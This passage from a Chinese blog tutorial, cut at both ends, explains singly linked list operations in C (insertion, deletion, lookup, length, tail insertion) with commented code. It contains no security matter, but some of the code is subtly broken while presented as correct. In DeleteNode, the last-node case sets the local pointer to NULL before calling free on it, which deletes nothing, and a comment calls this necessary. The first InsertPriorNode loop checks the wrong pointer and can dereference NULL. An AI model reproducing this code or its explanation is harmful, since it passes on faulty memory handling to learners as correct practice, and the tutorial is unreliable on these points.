class="number">1</span>) &#123; <span class="comment">//循环找到第i-1个结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="comment">//即i值不合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s; <span class="comment">// 将结点s到p之后</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//插入成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意⚠️: 第21行开始将结点e插入新开辟的空间s中,第22行和第23行的代码不能互换,<br>否则<code>p-&gt;next = s</code>之后<code>p-&gt;next</code>将会指向它自己,从而导致后方的链表被丢失.</p><h3 id="0x0202-指定结点的后插操作"><a href="#0x0202-指定结点的后插操作" class="headerlink" title="0x0202 指定结点的后插操作"></a>0x0202 指定结点的后插操作</h3><blockquote><p>算法思想: 向p结点之后插入元素e, 只需要新分配一个空间, 然后将需要插入的元素e放进这个空间, 再把这个新开辟的空间给放入我们需要插入的地方就行了, 具体实现代码如下:</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在p结点之后插入元素e</span></span><br><span class="line"><span class="comment"> * @param &#123;LNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextNode</span><span class="params">(LNode* p, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) <span class="comment">//如果内存分配失败return false;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;data = e; <span class="comment">//用结点s保存数据元素e</span></span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s; <span class="comment">//将结点s连到p之后</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0203-指定结点的前插操作"><a href="#0x0203-指定结点的前插操作" class="headerlink" title="0x0203 指定结点的前插操作"></a>0x0203 指定结点的前插操作</h3><p>注意⚠️: 单链表在不知道链表头指针的情况下是无法知道某一个结点之前的链表区域的.</p><blockquote><p>算法思想: 在给定的结点之前插入一个新的元素, 首先循环查找所给的都结点p的前驱结点q, 然后再对q进行后插操作.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在链表L中的指定结点p前插入元素e</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;LNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LinkList&amp; L, LNode* p, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    LNode* q; <span class="comment">//指针q用于指向当前扫描到的结点</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>; <span class="comment">//当前q指针指向的是第几个结点</span></span><br><span class="line">    q = L; <span class="comment">//指向头结点,从第0个结点开始扫描</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123; <span class="comment">//遍历L找到p的前驱结点</span></span><br><span class="line">        q = q-&gt;next; <span class="comment">//前往下一个结点</span></span><br><span class="line">        j++;</span><br><span class="line">        <span class="keyword">if</span> (q-&gt;next == p)<span class="comment">//找到p的前驱结点q</span></span><br><span class="line">            <span class="keyword">return</span> InsertNextNode(q, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//未找到结点p</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的代码可以看出这个算法的时间复杂度为 $O(n)$.<br>而且必须知道链表的<code>头指针L</code>, 那有没有什么办法可以直接在所给<code>结点p</code>前面直接插入呢?答案是有的:</p><blockquote><p>算法思想: 首先申请一片<code>空间s</code>, 先把新<code>结点s</code>连接🔗到所给<code>结点p</code>之后, 然后把<code>p</code>中的元素复制到新<code>结点s</code>中, 最后将<code>结点p</code>中的元素(data)覆盖为所要插入的<code>元素e</code>.</p></blockquote><p>实现代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在链表L中的指定结点p前插入元素e</span></span><br><span class="line"><span class="comment"> * @param &#123;LNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LNode* p, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="comment">//指定结点为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) <span class="comment">//分配空间失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next = p-&gt;next; <span class="comment">//将s和p原来的后继结点连接</span></span><br><span class="line">    p-&gt;next = s; <span class="comment">//将s连接到p之后</span></span><br><span class="line">    s-&gt;data = p-&gt;data; <span class="comment">//将p结点数据复制到结点s中</span></span><br><span class="line">    p-&gt;data = e; <span class="comment">//将元素e覆盖到原来的结点p中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//插入成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过上面的代码可以看出这个算法的时间复杂度为 $O(1)$, 优于第一种方法.</p><h3 id="0x0203-按位序删除操作"><a href="#0x0203-按位序删除操作" class="headerlink" title="0x0203 按位序删除操作"></a>0x0203 按位序删除操作</h3><blockquote><p>算法思想: 遍历链表, 寻找位序i的上一个位序为i-1的<code>结点p</code>, 结点p下一个<code>结点q</code>就是我们需要删除的结点, 然后先用e存放该结点q的元素用于返回删除的元素, 然后使用<code>p-&gt;next = q-&gt;next</code> 直接删除该结点.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 删除第i个结点上的元素e</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&amp;&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i, <span class="type">int</span>&amp; e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* p; <span class="comment">//指针p指向当前扫描到的结点</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>; <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">    p = L; <span class="comment">//L指向头结点,头结点是第0个结点(不存数据)</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; j &lt; i - <span class="number">1</span>) &#123; <span class="comment">//循环找到第i-1个结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="comment">//如果i值不合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>) <span class="comment">//如果第i-1个结点之后已无其他结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* q = p-&gt;next; <span class="comment">//令q指向被删除的结点</span></span><br><span class="line">    e = q-&gt;data; <span class="comment">//用e返回被删除的元素的值</span></span><br><span class="line">    p-&gt;next = q-&gt;next; <span class="comment">//将*q结点从链中“断开”</span></span><br><span class="line">    <span class="built_in">free</span>(q); <span class="comment">//释放结点的存储空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//删除成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0204-指定结点的删除操作"><a href="#0x0204-指定结点的删除操作" class="headerlink" title="0x0204 指定结点的删除操作"></a>0x0204 指定结点的删除操作</h3><blockquote><p>算法思想: 删除结点p, 只要把<code>结点p</code>的<code>后继结点</code>完完整整的<code>复制</code>过来,再把结点p的后继结点从链表中断开,并且释放这个p后继结点的空间.</p></blockquote><p>注意⚠️:<br>必须要判断删除的结点p是否位于链表末尾,否则有<code>p-&gt;next = NULL</code>, 这时候如果再有<code>p-&gt;next-&gt;next</code>会报指向空指针的报错.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 删除指定结点p</span></span><br><span class="line"><span class="comment"> * @param &#123;LNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNode</span><span class="params">(LNode* p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>) &#123; <span class="comment">//假如p为末尾结点,也就是p-&gt;next == NULL</span></span><br><span class="line">        p = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//释放一个指针free(p)和p=NULL是两者缺一不可</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        LNode* q = p-&gt;next; <span class="comment">//令q指向*p的后继结点</span></span><br><span class="line">        p-&gt;data = p-&gt;next-&gt;data; <span class="comment">//和后继结点交换数据域</span></span><br><span class="line">        p-&gt;next = q-&gt;next; <span class="comment">//将*q结点从链表中&quot;断开&quot;</span></span><br><span class="line">        <span class="built_in">free</span>(q); <span class="comment">//释放后继结点的储存空间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0205-按位查找操作"><a href="#0x0205-按位查找操作" class="headerlink" title="0x0205 按位查找操作"></a>0x0205 按位查找操作</h3><blockquote><p>算法思想: 遍历链表, 查找位序为i的结点, 并返回.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 返回第i个元素(带头结点)</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LNode* <span class="title function_">GetElem</span><span class="params">(LinkList L, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    LNode* p; <span class="comment">//指针p指向单钱扫描到的结点</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>; <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">    p = L; <span class="comment">//L指向头结点,头结点是第0个结点(不存数据)</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; j &lt; i) &#123;<span class="comment">// 循环找到第i个结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p; <span class="comment">//返回找到的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0206-按值查找操作"><a href="#0x0206-按值查找操作" class="headerlink" title="0x0206 按值查找操作"></a>0x0206 按值查找操作</h3><blockquote><p>算法思想: 遍历链表, 一一对比每个结点的数据域与所需查找的值e是否相等,找到则返回该结点的指针,否则返回NULL.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 找到数据域为e的结点</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LNode* <span class="title function_">LocateElem</span><span class="params">(LinkList L, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    LNode* p = L-&gt;next;</span><br><span class="line">    <span class="comment">//从第1个结点开始查找数据域为e的结点(带头结点的单链表头结点无data域)</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; p-&gt;data != e) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p; <span class="comment">//找到后返回该结点的指针,否则返回NULL表示该链表无值为e的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0207-求表的长度"><a href="#0x0207-求表的长度" class="headerlink" title="0x0207 求表的长度"></a>0x0207 求表的长度</h3><blockquote><p>算法思想: 从头到尾依次遍历, 然后用一个变量进行计数操作即可.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 求链表的长度</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>; <span class="comment">//统计表长</span></span><br><span class="line">    LNode* p = L;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果是不带头结点的单链表, 则需要在带头结点的表长的基础上加1, 因为带头结点的单链表头结点不带数据域不计入表长中.</p></blockquote><h2 id="0x03-不带头结点的单链表"><a href="#0x03-不带头结点的单链表" class="headerlink" title="0x03 不带头结点的单链表"></a>0x03 不带头结点的单链表</h2><p>不带头结点的单链表实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//每一个节点存放的数据</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>* <span class="title">next</span>;</span> <span class="comment">//存放下一个结点</span></span><br><span class="line">&#125;LNode, *LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化一个空链表，无头节点</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList&amp; L)</span> &#123;</span><br><span class="line">    L = <span class="literal">NULL</span>; <span class="comment">//空表，暂时没有任何节点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 判断不带头节点的单链表是否为空表</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(LinkList L)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//or return (L == NULL);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList L; <span class="comment">//声明一个指向单链表的指针</span></span><br><span class="line">    InitList(L); <span class="comment">//初始化一个空表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不带头结点的单链表, </p><ul><li>第一个结点从位序i&#x3D;1算起</li><li>而带头结点的位序从i&#x3D;0这个头指针算起, 且头指针不带数据域.</li></ul><p>只需要注意这两点即可, 下面的操作只做按位插入的演示(躺平开摆.jpg🤤), 其他的可参考带头结点的代码, 大致相同.</p><blockquote><p>如果不涉及遍历操作, 两者的代码实现基本一致.</p></blockquote><h3 id="0x0301-按位序插入"><a href="#0x0301-按位序插入" class="headerlink" title="0x0301 按位序插入"></a>0x0301 按位序插入</h3><p>不存在“第0个”结点,因此<code>i=1</code>时需要特殊处理.<br>在代码实现的时候<code>第i个位置</code>其实是找到<strong>第i-1个结点</strong>后将新的结点插入其后.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在表L中的第i个位置上插入制定元素e</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1</span>) &#123; <span class="comment">//插入第1个结点的操作与其他结点操作不同</span></span><br><span class="line">        LNode* s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = e;</span><br><span class="line">        s-&gt;next = L;</span><br><span class="line">        L = s; <span class="comment">//头指针指向新结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LNode* p; <span class="comment">//指针p指向当前扫描到的结点</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>; <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">    p = L; <span class="comment">//p指向第1个结点(注意 :不是头结点)</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; j &lt; i - <span class="number">1</span>) &#123; <span class="comment">//循环找到第i-1个结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="comment">//i值不合法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//插入成功return true;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-单链表的建立"><a href="#0x04-单链表的建立" class="headerlink" title="0x04 单链表的建立"></a>0x04 单链表的建立</h2><p>单链表的建立分为:</p><ul><li>尾插法</li><li>头插法</li></ul><blockquote><p>如果给你很多个数据元素(ElemType), 需要把它们存到一个单链表里, 该怎么做呢?</p><p>Step 1: 初始化一个单链表</p><p>Step 2: 每次取一个数据元素, 插入到 <code>表尾</code> 或者  <code>表头</code> .(对应<code>尾插法</code>和<code>头插法</code>)</p></blockquote><h3 id="0x0401-尾插法"><a href="#0x0401-尾插法" class="headerlink" title="0x0401 尾插法"></a>0x0401 尾插法</h3><blockquote><p><strong>算法思想:</strong> </p><p>初始化单链表;<br>设置变量length记录链表长度;<br>While 循环{<br>    每次取一个数据元素e;<br>    ListInsert(L, Length+1, e); &#x2F;&#x2F;插到链表尾部<br>      length++;<br>}</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 尾插法建立单链表(带头结点)</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList&amp; L)</span> &#123;</span><br><span class="line">    <span class="type">int</span> x; <span class="comment">//输入的ElemType为int型</span></span><br><span class="line">    L = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//建立头结点</span></span><br><span class="line">    LNode* s, * r = L; <span class="comment">//设置r为表尾指针</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x); <span class="comment">//输入一个值作为结点的数据域</span></span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">999</span>) &#123; <span class="comment">//此处999表示输入999则结束输入</span></span><br><span class="line">        s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//开辟一个新的空间存放输入的数据x</span></span><br><span class="line">        s-&gt;data = x; <span class="comment">//存入x</span></span><br><span class="line">        r-&gt;next = s; <span class="comment">//在当前表尾插入新输入的数据(连接操作)</span></span><br><span class="line">        r = s; <span class="comment">//继续让r指针指向表尾</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x); <span class="comment">//继续输入一个值作为数据域</span></span><br><span 